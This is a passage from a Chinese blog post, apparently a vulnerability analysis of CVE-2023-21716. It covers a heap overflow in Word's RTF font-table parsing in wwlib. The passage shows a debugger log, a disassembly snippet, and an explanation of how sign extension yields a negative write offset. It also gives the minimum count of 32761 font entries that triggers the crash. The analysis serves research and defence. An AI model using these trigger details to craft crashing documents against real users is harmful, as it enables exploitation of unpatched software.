</span></span><span class="line"><span class="cl">=== ecx: 0xd0d(3341) edx: 0xd16(3350)
</span></span><span class="line"><span class="cl">=== ecx: 0xd0e(3342) edx: 0xd16(3350)
</span></span><span class="line"><span class="cl">=== ecx: 0xd0f(3343) edx: 0xd16(3350)
</span></span><span class="line"><span class="cl">=== ecx: 0xd10(3344) edx: 0xd16(3350)
</span></span><span class="line"><span class="cl">=== ecx: 0xd11(3345) edx: 0xd16(3350)
</span></span><span class="line"><span class="cl">=== ecx: 0xd12(3346) edx: 0xd16(3350)
</span></span><span class="line"><span class="cl">=== ecx: 0xd13(3347) edx: 0xd16(3350)
</span></span><span class="line"><span class="cl">=== ecx: 0xd14(3348) edx: 0xd16(3350)
</span></span><span class="line"><span class="cl">=== ecx: 0xd15(3349) edx: 0xd16(3350)
</span></span><span class="line"><span class="cl">=== ecx: 0xd16(3350) edx: 0xd20(3360) // 每隔10次，edx+=10
</span></span><span class="line"><span class="cl">=== ecx: 0xd17(3351) edx: 0xd20(3360)
</span></span><span class="line"><span class="cl">[...]
</span></span><span class="line"><span class="cl">=== ecx: 0x7ff8(32760) edx: 0x8002(32770)
</span></span><span class="line"><span class="cl">(crash)
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>通过测试包含不同数量\f的样本，发现wwlib+0x002f00cf 触发次数和\f数量一致，且ecx与控制字参数无关，单纯代表索引一直递增</p>
</blockquote>
<p>随着索引值增大，由于使用了movsx，当[esi+2]的值达到0x8000时，会进行有符号扩展，edx的高位会被扩展成FFFF，导致了后面在102F00D5处写入时使用了负的偏移值，造成堆溢出。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00C8</span>                 <span class="nv">movsx</span>   <span class="nb">ecx</span><span class="p">,</span> <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esi</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00CB</span>                 <span class="nv">movsx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00CF</span>                 <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">+</span><span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span>  <span class="c1">; 上面打印ecx和edx日志的地方</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00D2</span>                 <span class="nv">mov</span>     <span class="nb">cx</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">102</span><span class="nf">F00D5</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="nb">edx</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="nb">cx</span> <span class="c1">; 溢出点，crash时edx=ffff7ffc</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>观察最后一次打印的ecx和edx，可以发现二者相差10，结合前面的规律可以看出此时edx第一次被扩展成负数，而这时候ecx等于32760，所以python脚本中的 32761是触发漏洞的最小值，range(0, 32761)生成了32761组\f</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">===</span> <span class="nl">ecx:</span> <span class="err">0</span><span class="nf">x7ff8</span><span class="p">(</span><span class="mi">32760</span><span class="p">)</span> <span class="nb">edx</span><span class="p">:</span> <span class="mh">0x8002</span><span class="p">(</span><span class="mi">32770</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.biblioscape.com/rtf15_spec.htm">https://www.biblioscape.com/rtf15_spec.htm</a> RTF规范</li>
<li><a href="https://qoop.org/publications/cve-2023-21716-rtf-fonttbl.md">https://qoop.org/publications/cve-2023-21716-rtf-fonttbl.md</a> 漏洞作者的分析</li>
</ul>

    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">文章作者</span>
    <span class="item-content"></span>
  </p>
  <p class="copyright-item">
    <span class="item-title">上次更新</span>
    <span class="item-content">
        2023-03-08
        
    </span>
  </p>
  
  
</div>
<footer class="post-footer">
      <div class="post-tags">
          <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="/post/windows-emacs-ssh-via-tramp/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">使用Emacs的tramp功能连接SSH服务</span>
            <span class="prev-text nav-mobile">上一篇</span>
          </a>
        <a class="next" href="/post/golang-call-conversion/">
            <span class="next-text nav-default">Golang call conversion (Golang 调用规约）</span>
            <span class="next-text nav-mobile">下一篇</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>
    <script src="https://giscus.app/client.js"
        data-repo="b1tg/b1tg.github.io"
        data-repo-id="MDEwOlJlcG9zaXRvcnkyMjIxMDgzNDI="
        data-category="Discuss"
        data-category-id="DIC_kwDODT0ats4CQAsT"
        data-mapping="title"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="bottom"
        data-theme="preferred_color_scheme"
        data-lang="en"
        crossorigin="anonymous"
        async>
    </script>
    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="http://github.com/b1tg" class="iconfont icon-github" title="github"></a>
  
</div>

<div class="copyright">
  <span class="power-by">
    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    主题 - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2018 - 
    2025<span class="heart"><i class="iconfont icon-heart"></i></span><span></span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>



<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>


<script defer src='https://static.cloudflareinsights.com/beacon.min.js' 
  data-cf-beacon='{"token": "f1aebb9faa064f7d8bdcd38a271c079e"}'>
</script>






</body>
</html>
